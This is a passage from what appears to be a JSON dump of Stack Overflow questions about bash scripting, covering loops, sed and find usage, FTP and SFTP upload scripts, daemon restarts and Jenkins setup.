go through each character, test if it is a special character and escape out of it.  So for instance...</p>\n\n<pre><code>pass=as$5!@?\n</code></pre>\n\n<p>What I have so far is close but not working for special characters, it will work for non-special...</p>\n\n<pre><code>echo -n $pass | while read -n 1 c; do [[ \"$c\" = [!@#$%^&amp;*().] ]] &amp;&amp; echo -n \"\\\\\"; echo -n $c; done\n</code></pre>\n\n<p>Anyone have thoughts on how I can add a \\ before each special character?</p>\n\n<p>Hope that clears up the question.</p>\n"},{"tags":["bash","script","iteration"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12925444,"title":"Prevent variable iteration in bash script for loop","body":"<p>I have a bash script in which i define a certain path as such:</p>\n\n<p><code>MY_PATH=/to/my/path</code></p>\n\n<p>I also have a set of directories within MY_PATH and I store these directories in an array, as such:</p>\n\n<pre><code>DIRECTORIES=\"/dir1/\n/dir2/\n/dir3/\"\n</code></pre>\n\n<p>What I want to do is iterate over all the $DIRECTORIES in $MY_PATH, so I tried this:</p>\n\n<pre><code>for dir in $MY_PATH$DIRECTORIES\ndo\n    echo \"Processing $dir\"\nend\n</code></pre>\n\n<p>However, this gives the following undesired output: </p>\n\n<pre><code>Processing /to/my/path/dir1/           #Correct!\nProcessing /dir2/                      #What I want: Processing /to/my/path/dir2/\nProcessing /dir3/                      #What I want: Processing /to/my/path/dir3/\n</code></pre>\n\n<p>Is there any way to prevent iteration over $MY_PATH while preserving iteration over $DIRECTORIES so that I can achieve the desired output (see above)?</p>\n"},{"tags":["linux","bash","daemon","nohup"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12926799,"title":"background jobs change to daemon without nohup/disown?","body":"<p>a strange thing to me\na script while.sh,it's content is:</p>\n\n<pre><code>while [ 1 ];do\nsleep 1\necho `date`\ndone\n</code></pre>\n\n<p>run as $while.sh >&amp; while.log &amp; (without nohup or disown or setsid or double fork())\nexit and login again can see this process is still exist，it's ppid is 1 and it's tty is ?</p>\n\n<p>my system is rhel6(rhel5 is the same, bash</p>\n\n<p>in centos5.x it must use nohup or disown or do double fork() in code</p>\n\n<p>what happen in rhel6</p>\n"},{"tags":["linux","bash","scripting","shell"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":300,"score":1,"question_id":2091300,"title":"Loop exits after first iteration","body":"<pre><code>cat hosts.txt | while read h; do telnet $h; done\n</code></pre>\n\n<p>When I run this, it telnets to first host which denies the connection but then exits instead of looping over the other hosts in the file.\nWhy is it exiting the loop after the first host and how can I fix it?</p>\n\n<p>Thanks.</p>\n"},{"tags":["linux","bash","sed","substitution"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":95,"score":0,"question_id":12912357,"title":"sed - batch 'key=value' substitute","body":"<p>I'm working on a function to perform multiple <code>key=value</code> substitutions with <code>sed</code>:</p>\n\n<pre><code>batch_sub () {\n    local file=\"${@: -1}\" # Last argument is file to be changed.\n    [[ -w \"${file}\" ]] || { echo \"Invalid file: ${file}\" ; return 1 ; }\n    for arg in \"${@}\" ; do\n        [[ $arg =~ (.*)=(.*) ]] || continue\n        # 'trim_str' will trim leading &amp; trailing spaces.\n        local key=$(trim_str \"${BASH_REMATCH[1]}\")\n        local value=${BASH_REMATCH[2]}\n        sed -i 's@'\"\\(${key}\"' *=\\).*@\\1'\"${value}\"'@' \"${file}\"\n    done\n}\n</code></pre>\n\n<p>this function accepts arguments like:</p>\n\n<pre><code>batch_sub \"a = x\" \"b = y\" \"c = z\" \"a.b.d.e=udp://b:8080\" \"/tmp/file\"\n</code></pre>\n\n<p>and works fine.  But what I want is to make it accept arguments like this:</p>\n\n<pre><code>batch_sub \"a = x b = y c = z a.b.d.e=udp://b:8080\" \"/tmp/file\"\n</code></pre>\n\n<p>Furthermore, it would be nice if <code>sed</code> is invoked only once inside this function:</p>\n\n<pre><code>sed -i -e 's/$key=/\\1$value/'\n       -e 's/$key1=/\\1$value1/'\n       '/tmp/file'\n</code></pre>\n\n<p>please advise.</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":78,"score":2,"question_id":11172221,"title":"How do I include an environment variable inside an alias for bash?","body":"<p>I am pretty new to bash, and I want to include an env for bash aliases.. I want to do something like the following</p>\n\n<pre><code>alias foo=\"bar $(baz)\"\n</code></pre>\n\n<p>So that I could do something like the following</p>\n\n<pre><code>&gt; baz=40\n&gt; foo\n</code></pre>\n\n<p>and foo will expand to the command <code>bar 40</code>. Currently the above does not work because $(baz) is expanded while making the alias. Do I have to wrap this inside a function or something?</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12925923,"title":"Run a Bash script command in a specified folder","body":"<p>In a Bash script, is it possible to run a command in a specific folder? For example, I'd like to create a script that prints the contents of the <code>/home</code> folder using <code>ls</code>, no matter which directory the script is saved in.</p>\n"},{"tags":["linux","bash","shell","ack"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12925496,"title":"ack ignore files matching a path in conjunction with positive path match","body":"<p>I want to do a command that searches all .js and .php files, but ignores paths with \"Thirdparty/\" and \"data.js\" in them.</p>\n\n<pre><code>ack -il -G '(\\.js|\\.php)' 'my search string'\n</code></pre>\n\n<p>I tried -v but it seems to inverse all -G operators, not just the preceeding operator:</p>\n\n<pre><code>ack -il -G '(\\.js|\\.php)' -G '(Thirdparty|data\\.js)' -v 'my search string'\n</code></pre>\n\n<p>I want to ignore ./Thirdparty paths and also ./data.js path but match all over .js and .php files.</p>\n"},{"tags":["bash","sed","awk"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":72,"score":1,"question_id":12847488,"title":"Interweave two files bash script","body":"<p>I am trying to interweave two files that contain one sentence per line. I double spaced (<code>sed G</code>) the first file and I would like to incorporate the content of the second file into those empty lines.</p>\n\n<p>How can I interweave both files so that the 1st line of file B goes below the 1st line in file A, the 2nd line of file B below the 2nd line of file A, until it reaches the end ?</p>\n\n<p>Example: [line number|sentence number|sentence]</p>\n\n<pre><code>1  1 fileA\n2   \n3  2 fileA\n4  \n5  3 fileA\n6  \n7  4 fileA\n</code></pre>\n\n<p>Expected result:</p>\n\n<pre><code>1  1 fileA\n2  1 FILEB\n3  2 fileA\n4  2 FILEB\n5  3 fileA\n6  3 FILEB\n7  4 fileA\n</code></pre>\n\n<p>This is for a bash script: can it be done with <code>sed</code> or <code>awk</code>?</p>\n"},{"tags":["bash","recursion","sed","find"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":76,"score":3,"question_id":12902873,"title":"Using `find` for multiple file types and replacing strings in found files","body":"<p>I'm trying to recursively find files of multiple types, and replace a certain string in each of the files found. But when I run the script, it only finds files of one single type.</p>\n\n<p>The command line I'm using is this</p>\n\n<pre><code>find . -name '*.tcl' -o -name '*.itcl' -o -name '*.db' -exec sed -i 's/abc/cba/g' {} +\n</code></pre>\n\n<p>Every time I run the command above, it only finds files of type <code>.db</code>. When I run it with a single file type, it works fine.</p>\n"},{"tags":["arrays","bash","variables","grep","cut"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":12915414,"title":"Save the multiline output of 'grep | cut' to a variable","body":"<p>I'm new here and I'll do my best to explain my problem :)</p>\n\n<p>I want to write a backup script to save all <code>lv</code>'s used by KVM.</p>\n\n<p>OS: Ubuntu Server x64 12.04</p>\n\n<p>Bash 4.2.24</p>\n\n<p>XML file content:</p>\n\n<pre><code>&lt;source file='/dev/vg1/lv1'/&gt;\n&lt;source file='/dev/vg1/lv2'/&gt;\n</code></pre>\n\n<p>My grep/cut command</p>\n\n<pre><code>grep \"&lt;source file='.*.'/&gt;\" /backup/$SRCNAME/$DATUM/$SRCNAME.xml | cut -f2 -d\"'\" | cut -f4 -d\"/\"\n</code></pre>\n\n<p>This outputs</p>\n\n<pre><code>lv1\nlv2\n</code></pre>\n\n<p>How do I get it to do something with each output - is storing the output in an array the best way?</p>\n\n<p>I've been searching for an answer for 2 days now :( I've tried some loops and pipes, but nothing worked because my grep command is too specific :/</p>\n"},{"tags":["bash","script","upload","ftp"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":12922711,"title":"Scripting a major multi-file multi-server FTP upload: is smart interrupted transfer resuming possible?","body":"<p>I'm trying to upload several hundred files to 10+ different servers. I previously accomplished this using FileZilla, but I'm trying to make it go using just common command-line tools and shell scripts so that it isn't dependent on working from a particular host.</p>\n\n<p>Right now I have a shell script that takes a list of servers (in <a href=\"ftp://user:pass@host.com\" rel=\"nofollow\">ftp://user:pass@host.com</a> format) and spawns a new background instance of 'ftp <a href=\"ftp://user:pass@host.com\" rel=\"nofollow\">ftp://user:pass@host.com</a> &lt; batch.file' for each server.</p>\n\n<p>This works in principle, but as soon as the connection to a given server times out/resets/gets interrupted, it breaks. While all the other transfers keep going, I have no way of resuming whichever transfer(s) have been interrupted. The only way to know if this has happened is to check each receiving server by hand. This sucks!</p>\n\n<p>Right now I'm looking at wput and lftp, but these would require installation on whichever host I want to run the upload from. Any suggestions on how to accomplish this in a simpler way?</p>\n"},{"tags":["linux","bash","unix","process"],"answer_count":4,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":1745,"score":6,"question_id":1715347,"title":"if-statement always evaluates to TRUE","body":"<p>Is there any reason why this script always returns \"running\", regardless of whether my  process is started or stopped?</p>\n\n<pre><code>if ps ax | grep -v grep | grep \"processName\" &gt; /dev/null\nthen\n   echo $\"running\"\nelse\n   echo $\"not running\"\nfi\n</code></pre>\n\n<p>Thank you very much</p>\n\n<p><strong>UPDATE :</strong>\nI add a full example of my script, maybe there is something wrong elsewhere.</p>\n\n<pre><code>case \"$1\" in\n  start)\n    # Start daemons.\n\n    echo -n $\"Starting daemon: \"\n    ;;\n\n  stop)\n    # Stop daemons.\n    echo -n $\"Shutting down: \"\n    echo\n    ;;\n  status)\n    pgrep -f \"ProcessName\" &gt; /dev/null\n    if [ $? -eq 0 ]; then\n        echo $\"ProcessName is running\"\n    else\n        echo $\"ProcessName is not running\"\n    fi\n    ;;\n  restart)\n    $0 stop\n    $0 start\n    ;;\n\n  *)\n    echo $\"Usage: $0 {start|stop|status|restart}\"\n    exit 1\nesac\n</code></pre>\n\n<p><strong>UPDATE 2 :</strong></p>\n\n<pre><code>[user@dev init.d]# pgrep -f \"MyProcess\" &gt; /dev/null\n[user@dev init.d]# echo $?\n0\n[user@dev init.d]# service MyProcess stop\nShutting down MyProcess: Terminated\n[user@dev init.d]# pgrep -f \"MyProcess\" &gt; /dev/null\n[user@dev init.d]# echo $?\n1\n</code></pre>\n\n<p>But <code>if [ $? -eq 0 ]; then</code> seems to be TRUE all the time</p>\n"},{"tags":["linux","bash","unix"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12921438,"title":"How do I check what files I have permission to read in a directory?","body":"<p>I can see an individual file's permissions with <code>ls -l</code>.</p>\n\n<p>In the case where there are hundreds or thousands of files in a directory - most of which I can't read, how do I check which files I have permission to read?</p>\n"},{"tags":["linux","bash","shell","command-line"],"answer_count":5,"favorite_count":1,"up_vote_count":10,"down_vote_count":0,"view_count":21116,"score":10,"question_id":4651437,"title":"How to set a BASH variable equal to the output from a command?","body":"<p>I am working on a simple scripting project for work that involves the use of BASH.  I have a pretty simple script that is something like the following:</p>\n\n<pre><code>#!/bin/bash\n\nVAR1=\"$1\"\nVAR2=\"$2\"\n\nMOREF='sudo run command against $VAR1 | grep name | cut -c7-'\n\necho $MOREF\n</code></pre>\n\n<p>When I run this script from the command line and pass it the arguments I am not able to get any output.  However, when I run the commands contained within the MOREF variable, I am able to get output.  I would like to know how one can take the results of a command that needs to be run within a script, save it to a variable, and then output that variable on the screen?</p>\n"},{"tags":["bash","sh"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12921873,"title":"Parsing files in subdirectories","body":"<p>I´m using Zarafa as groupware ( for testing purpose only ) with XMail Server.\nTo import the mails to the Zarafa system, they need to be parsed by a binary called \"zarafa-dagent\".</p>\n\n<p>The folder structure is: <code>/var/MailRoot/domains/xxxxx.xxx/$user/Maildir/</code>\nThese folder have subdirectories <code>tmp</code>, <code>new</code> and <code>cur</code>.</p>\n\n<p>My problem is that I can´t get the script working to parse all emails in 10 or 12 <code>$userdirs</code>.</p>\n\n<p>Here is my current script:</p>\n\n<pre><code>userlist=`ls /var/MailRoot/domains/xxx.xx/`\nfilelist=\"/var/MailRoot/domains/xxx.xx/$userlist/Maildir/new/*\"\n\nfor user in $userlist;\n  do\n   cd \"/var/MailRoot/domains/xxx.xx/\"$user\"/Maildir/new/\";\n   \"/usr/bin/zarafa-dagent $user -f *\"\ndone\n</code></pre>\n\n<p>The script outputs a message about not finding the files to parse.</p>\n\n<p>The zarafa-dagent binary needs 2 arguments: 1 username, -f file_to_parse</p>\n"},{"tags":["bash","pipe"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":74,"score":1,"question_id":12903957,"title":"Shell/Bash - pipe output into another script's input via a variable","body":"<p>Normally I would break things into separate actions and copy and paste the output into another input:</p>\n\n<pre><code>$ which git\n/usr/local/bin/git\n$ sudo mv git-credential-osxkeychain /usr/local/bin/git\n</code></pre>\n\n<p>Any quick hack to get output into input?\nsomething like:\n<code>$echo which wget | sudo mv git-credential-osxkeychain</code></p>\n"},{"tags":["git","bash","shell","tmux"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12921852,"title":".tmux.conf: update status commands on panel focus","body":"<p>I have a line in my .tmux.conf which simply shows me the git branch I am on.</p>\n\n<p><code>set                 -g status-right ' #[bg=colour33] Branch #[(git branch)] '</code></p>\n\n<p>When working in tmux, I regularly have panels in different directories. So my question becomes, is there a way to have the status command re-execute based on my \"panel's cwd\", instead of what it is doing now, where it seems to just hold onto the directory I was in when tmux was first opened.. ?</p>\n"},{"tags":["string","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":12921082,"title":"String comparison in Bash script not working","body":"<p>I wrote the following script in Bash but it is not printing the desired output:</p>\n\n<pre><code>a=\"abc\"\n\nif (test \"$a\"=\"$a \") then \n    echo \"true \"\nelse\n    echo \"false \"\nfi\n</code></pre>\n\n<p>This script should print <code>false</code> but it isn't. I'm new to Bash scripting, so can anyone please tell me why it is not printing <code>false</code>?</p>\n"},{"tags":["bash","sed"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12921839,"title":"Remove numbers within brackets only","body":"<p>How can I remove numbers within brackets only?\nFor example, I have the following text:</p>\n\n<pre><code>This is 14 April [988] text..\n</code></pre>\n\n<p>I would like to remove the <code>[988]</code> and leave <code>14</code> intact.</p>\n\n<p>What i've tried so far:</p>\n\n<pre><code>sed 's@\\[[0-9]\\]@@g'\n</code></pre>\n"},{"tags":["javascript","image","bash","pdf"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12921052,"title":"Parsing PDF pages as javascript Images","body":"<p>As per title, is there any way I can parse pages from an unprotected PDF file as javascript Image() objects?</p>\n\n<p>It would also be ok to convert them before running the javascript, but I would like this to be done automatically and without the assistance of any library which requires installation.</p>\n\n<p>Someone over the internet has posted this Bash script. Unfortunately, I don't know Bash but running it was very simple.</p>\n\n<pre><code>#!/bin/bash\nPDF='doc.pdf'\nNUMPAGES=`identify -format %n \"$PDF\"`\n\nfor (( IDX=0; IDX&lt;$NUMPAGES; IDX++ ))\ndo\n  PAGE=$(($IDX+1))\n  convert -resize 1200x900 \"$PDF[$IDX]\" `echo \"$PDF\" | sed \"s/\\.pdf$/-page$PAGE.jpg/\"`\ndone\n\necho \"Done\"\n</code></pre>\n\n<p>But I got these errors:</p>\n\n<pre><code>line 3: identify: command not found\nline 5: ((: IDX&lt;: syntax error: operand expected (error token is \"&lt;\")\n</code></pre>\n\n<p>Pre-converting the PDF using a Bash script would be a good solution. Can someone fix the script above or either provide an alternative solution?</p>\n\n<p>Many thanks in advance!</p>\n"},{"tags":["bash","shell","sh"],"answer_count":5,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":10001,"score":4,"question_id":2578116,"title":"How can I test if line is empty in shell script?","body":"<p>I have a shell script like this: </p>\n\n<pre><code>cat file | while read line\ndo\n    # run some commands using $line    \ndone\n</code></pre>\n\n<p>Now I need to check if the line contains any non-whitespace character ([\\n\\t ]), and if not, skip it.\nHow can I do this?</p>\n"},{"tags":["bash","process"],"answer_count":4,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":100,"score":1,"question_id":12916352,"title":"Shell script read missing last line","body":"<p>I have an ... odd issue with a bash shell script that I was hoping to get some insight on. </p>\n\n<p>My team is working on a script that iterates through lines in a file and checks for content in each one. We had a bug where, when run via the automated process that sequences different scripts together, the last line wasn't being seen.</p>\n\n<p>The code used to iterate over the lines in the file (name stored in <code>DATAFILE</code> was</p>\n\n<pre><code>cat \"$DATAFILE\" | while read line \n</code></pre>\n\n<p>We could run the script from the command line and it would see every line in the file, including the last one, just fine. However, when run by the automated process (which runs the script that generates the DATAFILE just prior to the script in question), the last line is never seen.</p>\n\n<p>We updated the code to use the following to iterate over the lines, and the problem cleared up:</p>\n\n<pre><code>for line in `cat \"$DATAFILE\"` \n</code></pre>\n\n<p><em>Note: DATAFILE has no newline ever written at the end of the file.</em></p>\n\n<p>My question is two part... Why would the last line not be seen by the original code, and why this would change make a difference?</p>\n\n<p>I only thought I could come up with as to why the last line would not be seen was:</p>\n\n<ul>\n<li>The previous process, which writes the file, was relying on the process to end to close the file descriptor.</li>\n<li>The problem script was starting up and opening the file prior fast enough that, while the previous process had \"ended\", it hadn't \"shut down/cleaned up\" enough for the system to close the file descriptor automatically for it.</li>\n</ul>\n\n<p>That being said, it seems like, if you have 2 commands in a shell script, the first one should be completely shut down by the time the script runs the second one.</p>\n\n<p>Any insight into the questions, especially the first one, would be very much appreciated.</p>\n"},{"tags":["bash","shell","unix","paste"],"answer_count":3,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":125,"score":4,"question_id":12912727,"title":"Paste column to existing file in a loop","body":"<p>I am using the paste command in a bash loop to add new columns to a CSV-file. I would like to reuse the CSV-file. Currently I am using a temporary file to accomplish this:</p>\n\n<pre><code>while [ $i -le $max ]\n    do\n        # create text from grib2\n        wgrib2 -d 1.$(($i+1)) -no_header myGribFile.grb2 -text tmptxt.txt\n\n        #paste to temporary file\n        paste -d, existingfile.csv tmptxt.txt &gt; tmpcsv.csv  \n\n        #overwrite old csv with new csv\n        mv tmpcsv.csv existingfile.csv\n\n        ((i++))\n    done\n</code></pre>\n\n<p>After adding some columns the copy is getting slow, because the file is becoming bigger and bigger (every <code>tmptxt.txt</code> has about 2 MB, adding to approx 100 MB).</p>\n\n<p>A <code>tmptxt.txt</code> is a plain txt-file with one column and one value per row:</p>\n\n<pre><code>1\n2\n3\n.\n.\n</code></pre>\n\n<p>The <code>existingfile.csv</code> would then be</p>\n\n<pre><code>1,1,x\n2,2,y\n3,3,z\n.,.,.\n.,.,.\n</code></pre>\n\n<p>Is there any way to use the paste command to add a column to an existing file? Or is there any other way?</p>\n\n<p>Thanks</p>\n"},{"tags":["linux","bash"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":78,"score":2,"question_id":12918815,"title":"Bash redirect and stdin","body":"<p>I'm hoping this is a quick question for a guru.\nI have the following command which works great from the command line:</p>\n\n<pre><code> src/protected/yiic shell src/index.php &lt;&lt;&lt; createmvp &lt; /dev/tty\n</code></pre>\n\n<p>This command executes the yiic bash script and passes it the arguments shell and src/index.php.</p>\n\n<p>The first &lt;&lt;&lt; passes the argument createmvp to the terminal prompt which is displayed when yiic shell src/index.php is run on it's own.</p>\n\n<p>The second &lt; then allows std in to be returned to the application.</p>\n\n<p>However when I run this inside a bash script</p>\n\n<pre><code>#!/bin/bash\nsrc/protected/yiic shell src/index.php &lt;&lt;&lt; createmvp &lt; /dev/tty\n</code></pre>\n\n<p>The script doesn't pass createmvp into the shell.\nIf I remove the &lt; /dev/tty bit passing createmvp works, but then recapture the terminal obviously doesn't. Nothing I seem to do works.</p>\n\n<pre><code>while(!isset($input))\n{\n    $input = trim(fgets(STDIN));\n    if(!$input)\n        echo \"$configVar can not be NULL\";\n}\n</code></pre>\n\n<p>Any ideas, on how to make this work as it does from the command line?</p>\n\n<p>Thanks in advance</p>\n\n<p>Alan</p>\n"},{"tags":["iphone","objective-c","ios","xcode","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12917729,"title":"Create a run script to package and zip compiled library","body":"<p>So I want to create a run script (build phase) that will automatically create a .zip folder with the compiled library (.a file) and all the relevant .h files that are needed for distribution.</p>\n\n<p>Does anyone have a sample bash script for this? Something that can be replicated reliably over different projects?</p>\n\n<p>Many thanks.</p>\n"},{"tags":["bash","login","script","expect","openvpn"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":11299523,"title":"Using expect to log into VPN from a bash script","body":"<p>I connect to a VPN from console using something like:</p>\n\n<pre><code>sudo openvpn my.conf\n[sudo] password for user:\nEnter Auth Username:my_user\nEnter Auth Password:\n</code></pre>\n\n<p>I don't care about entering the admin pwd manually but I want to automate the vpn auth, I think expect is what I need to do this but I don't know how to use it and I never coded a bash script.</p>\n\n<p><strong>Could someone show me a simple bash script using expect so I can use it for this?</strong></p>\n"},{"tags":["perl","bash","pass"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12917585,"title":"Output of bash script in perl script","body":"<p>I want to embed a bash script inside  a perl script. I want to run my bash script by taking some variables from the perl script. Once it gets the variable the bash script takes over and tries to output the files that is created within.</p>\n\n<p>How can I pass the perl script variable to my bash script ?</p>\n\n<p>I do not know perl  but from what I read in Google, I can embed my bash script as</p>\n\n<pre><code>system(\"get_files.cmd -yr ${year}\");\n</code></pre>\n\n<p>where my bash script is <code>get_files.cmd</code>. </p>\n"},{"tags":["bash","vim","vimrc","vimscript"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12343325,"title":"Vim programmatically save with different file extension","body":"<p>I'm writing slim files in Vim and I want them to compile and save as html files when I save. Adding this to my .vimrc makes it happen for files in the current directory:</p>\n\n<p><code>au BufWritePost *.slim silent !slimrb % &gt; $(echo % | cut -d'.' -f1).html</code></p>\n\n<p>It doesn't work for files with a path like <code>../file.slim</code> since the cut command turns it into\n<code>./file.slim</code>.</p>\n\n<p>I need to use <a href=\"http://stackoverflow.com/a/965072/659910\">parameter expansions</a> but the % character is reserved for the current filepath when executing an external command in Vim.</p>\n\n<p>How do I compile and save a slim file to a html file regardless of the directory of the file?</p>\n"},{"tags":["linux","bash","script","javac"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":12916797,"title":"Bash java auto compiler","body":"<p>I am currently trying to make a bash script that will go into every folder in ./ and compile blah.java, then run blah sending in a number for an input, and put the output in a file that I have named. I have something that is somewhat functional, but it only goes into the first directory, and after that it fails on me. I currently have...</p>\n\n<pre><code>#! /bin/bash\n\n\nfor i in $(find . -maxdepth 1 -type d)\ndo\n\n    pwd\n    cd $i\n    pwd\n\n    if [ -f \"blah.java\" ];\n    then\n        javac -cp . blah.java\n        echo \"17\" | java -cp . blah - &gt; blahresult17\n        echo \"43\" | java -cp . blah - &gt; blahresult43\n\n    fi\n\ndone\n</code></pre>\n\n<p>I think it is having problems, because it is trying to go into a directory from ./ once it goes into a subdirectory, but obviously from the subdirectory it doesn't exist.</p>\n"},{"tags":["multithreading","bash","restart","sysadmin"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":90,"score":0,"question_id":12877607,"title":"Write a bash script to restart a daemon","body":"<p>I thought I could just use this related question: <a href=\"http://stackoverflow.com/questions/696839/how-do-i-write-a-bash-script-to-restart-a-process-if-it-dies\">How Do I write a bash script to restart a process if it dies</a>.  @lhunath had a great answer and told me everything I might do about it was wrong, but I'm restarting a daemon process and if I'm hoping there's something I can do in a single script that works. </p>\n\n<p>my process starts with a kick off script that shows the startup log, but then quits and leaves the process running off the shell: </p>\n\n<pre><code>&gt;sudo ./start\nR CMD Rserve --RS-conf /var/FastRWeb/code/rserve.conf --vanilla --no-save\n...\nLoading required package: FastRWeb\nFastRWeb: TRUE\nLoading data...\nRserv started in daemon mode.\n&gt;\n</code></pre>\n\n<p>The process is up and running,</p>\n\n<blockquote>\n  <p>ps -ale | grep Rserve\n      1 S    33 16534     1  0  80   0 - 60022 poll_s ?        00:00:00 Rserve</p>\n</blockquote>\n\n<p>Is there a simple way to wrap or call the 'start' script from bash and restart when the process dies or is this a case where PID files are actually called for? </p>\n\n<p>Dang - question got closed even after pointing to a very similar question that was not closed on stackoverflow. you guys suck</p>\n"},{"tags":["python","bash","shell"],"answer_count":13,"favorite_count":44,"up_vote_count":68,"down_vote_count":0,"view_count":16609,"score":68,"question_id":209470,"title":"Can I use Python as a bash replacement?","body":"<p>I currently do my textfile manipulation through a bunch of badly remembered awk, sed, bash and a tiny bit of Perl.</p>\n\n<p>I've seen mentioned a few places that python is good for this kind of thing, I know a little and I would like to know more. Is python a good choice for this, and is there a good book or guide to learning how to use python to replace shell scripting, awk, sed and friends?</p>\n"},{"tags":["bash","shell","unix"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":84,"score":0,"question_id":12915384,"title":"Unix shell script retrieving multiple files at different timings","body":"<p>I have below requirement:</p>\n\n<p>I have one java process it writes lot of files into unix folder everyday,But below files  needs sftp to different folder using Unix Shell Script</p>\n\n<p>TestSD20121016.csv (It writes file into unix folder at 16:00P.M everyday)\nTestSP20121016.csv(It writes file into unix folder at 17:00P.M everyday)</p>\n\n<p>Script I written as below:</p>\n\n<pre><code>#!/bin/sh\n#------------------------------------------------------------------------\n# Parameters\n# sftp_file_uploads.sh remoteServer functionalId\n#------------------------------------------------------------------------\n\nREMOTE_SERVER=$1\nFUNCTIONAL_ID=$2\nFILE_TO_UPLOAD= ls -lrt TESTSD`date \"+%Y%m%d\"`*.CSV  | awk '/TEST/{ f=$NF };END{ print f }'\n\n\n#------------------------------------------------------------------------\n# Create sftp script\n#------------------------------------------------------------------------\nrm -f /var/tmp/SFTP_FILE_UPLOAD\necho \"lcd $3\" &gt; /var/tmp/SFTP_FILE_UPLOAD\necho \"cd $5\" &gt;&gt; /var/tmp/SFTP_FILE_UPLOAD\necho \"put $FILE_TO_UPLOAD\" &gt;&gt; /var/tmp/SFTP_FILE_UPLOAD\necho \"bye\" &gt;&gt; /var/tmp/SFTP_FILE_UPLOAD\n\n\n\n#------------------------------------------------------------------------\n# Do sftp\n#------------------------------------------------------------------------\necho \" Before SFTP \" &gt; /tmp/FILE_UPLOAD_LOG\n/usr/bin/sftp -B /var/tmp/SFTP_FILE_UPLOAD $2@$1 1&gt;/var/tmp/sftp.log 2&gt;&amp;1\n\nresult=$?\nif [ $result -eq 0 ]\nthen\n  echo \"SFTP completed successfully\"\nelse\n  echo \"FAILED to SFTP\"\n  exit 1\nfi\n\nexit 0\n</code></pre>\n\n<p>Problem is script is able to take file TestSD20121016.csv but not file TestSP20121016.csv,I dont know how to write above script to do sftp second file also.</p>\n\n<p>Regards,</p>\n\n<p>Chaitu</p>\n"},{"tags":["bash","firefox","unix","process","kill"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":12910174,"title":"Opening and closing a process using bash","body":"<p>Using Ubuntu, I would like to create a shell script (bash) for an Ubuntu server, that will open an instance of firefox and then close <strong>that</strong> specific instance the browser? </p>\n\n<p>To open an instance of firefox, I can write:</p>\n\n<pre><code>firefox www.example.com\n</code></pre>\n\n<p>I have read that to search for all firefox instances, and to close them <strong>manually</strong> I can write:</p>\n\n<pre><code>ps aux | grep firefox\npidof firefox\nkill #process#\n</code></pre>\n\n<p>But is there a way for me to search for the <strong>specific</strong> instance  instance of firefox that I opened at the start?</p>\n"},{"tags":["bash","jenkins","master",".bash-profile","slave"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12905196,"title":"Setup Master for builds on Jenkins","body":"<p>I moved jenkins from one server to another and while most things seem to be working I can no longer build on master.</p>\n\n<p>When I run a job on master no bash profile is sourced so I'm missing all my paths. To debug, I setup a slave with the same credentials as master and it works just fine. I get the job to echo the username and machine name and they are the same whether running on \"master\" or on the slave which is setup on the same machine.</p>\n\n<p>Any ideas on how to get jenkins to source the bash profile when running on master?</p>\n\n<p>EDIT: I just realized that I don't encounter this issue if I launch jenkins from the command line manually. For example, the first command below works, the second doesn't:</p>\n\n<pre><code>$ nohup java -jar \"${JENKINS_PATH}\" --httpPort=${HTTP_PORT} &gt; ${LOG_PATH} 2&gt;&amp;1 &amp;  # WORKS\n$ /sbin/service jenkins start  # DOESN'T WORK\n</code></pre>\n\n<p>The command to launch jenkins in the startup script is the same as what I'm running on the command 